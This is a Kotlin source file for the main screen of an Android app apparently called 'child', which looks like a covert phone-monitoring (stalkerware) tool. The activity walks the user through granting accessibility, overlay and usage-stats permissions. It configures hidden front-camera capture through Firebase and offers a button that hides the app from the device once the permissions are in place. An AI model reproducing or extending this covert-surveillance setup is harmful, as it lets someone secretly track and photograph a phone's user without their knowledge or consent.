package com.github.midros.child.ui.main

import android.os.Bundle
import android.widget.Button
import com.github.midros.child.R
import com.github.midros.child.data.model.ChildPhoto
import com.github.midros.child.data.rxFirebase.InterfaceFirebase
import com.github.midros.child.ui.base.BaseActivity
import com.github.midros.child.utils.AsyncTaskEnableAccessibility
import com.github.midros.child.utils.Consts.CHILD_PERMISSION
import com.github.midros.child.utils.Consts.CHILD_SHOW_APP
import com.github.midros.child.utils.Consts.DATA
import com.github.midros.child.utils.Consts.PARAMS
import com.github.midros.child.utils.Consts.PHOTO
import com.github.midros.child.utils.hiddenCameraServiceUtils.HiddenCameraUtils.canOverDrawOtherApps
import com.github.midros.child.utils.hiddenCameraServiceUtils.HiddenCameraUtils.openDrawOverPermissionSetting
import com.github.midros.child.utils.hiddenCameraServiceUtils.config.CameraFacing
import com.google.firebase.database.DatabaseReference
import kotterknife.bindView
import javax.inject.Inject
import android.widget.RelativeLayout
import android.widget.Switch
import com.github.midros.child.utils.ConstFun.openUseAccessSettings
import com.github.midros.child.utils.checkForegroundApp.CheckPermission.hasUsageStatsPermission

/**
 * Created by luis rafael on 27/03/18.
 */
class MainActivity : BaseActivity() {

    private val btnHideApp: Button by bindView(R.id.btn_hide_app)
    private val btnEnableService: RelativeLayout by bindView(R.id.btn_enable_service)
    private val btnEnableOverDraw: RelativeLayout by bindView(R.id.btn_enable_overdraw)
    private val btnEnableUsageStats: RelativeLayout by bindView(R.id.btn_enable_usage_stats)
    private val switchOverDraw: Switch by bindView(R.id.switch_overdraw)
    private val switchUsageStats: Switch  by bindView(R.id.switch_usage_stats)

    @Inject
    lateinit var firebase: InterfaceFirebase

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        getComponent()!!.inject(this)
        init()
        onClickApp()
    }

    override fun onResume() {
        super.onResume()
        checkSwitchPermissions()
    }

    private fun init() {

        getReference("$DATA/$CHILD_SHOW_APP").setValue(true)

        //photo
        val childPhoto = ChildPhoto(false, CameraFacing.FRONT_FACING_CAMERA)
        getReference("$PHOTO/$PARAMS").setValue(childPhoto)
        getReference("$PHOTO/$CHILD_PERMISSION").setValue(true)

    }

    private fun checkSwitchPermissions() {
        switchOverDraw.isChecked = canOverDrawOtherApps()
        switchUsageStats.isChecked = hasUsageStatsPermission()
    }

    private fun onClickApp() {
        btnHideApp.setOnClickListener {
            checkPermissions()
        }
        btnEnableService.setOnClickListener {
            showAlertDialog(R.string.msg_dialog_enable_accessibility_service, android.R.string.ok) {
                dismiss()
                AsyncTaskEnableAccessibility(this@MainActivity).execute()
            }
        }
        btnEnableOverDraw.setOnClickListener {
            openDrawOverPermissionSetting()
        }
        btnEnableUsageStats.setOnClickListener {
            openUseAccessSettings()
        }
    }

    private fun getReference(child: String): DatabaseReference = firebase.getDatabaseReference(child)

    private fun checkPermissions() {
        if (hasUsageStatsPermission()) {
            if (canOverDrawOtherApps()) {
                getReference("$DATA/$CHILD_SHOW_APP").setValue(false)
                showLoading(getString(R.string.hiding))
            } else showAlertDialog(R.string.msg_dialog_enable_overdraw, R.string.go_to_setting) { openDrawOverPermissionSetting() }
        } else showAlertDialog(R.string.msg_dialog_enable_usage_stats, R.string.go_to_setting) { openUseAccessSettings() }

    }

    override fun onDestroy() {
        hideLoading()
        super.onDestroy()
    }
}
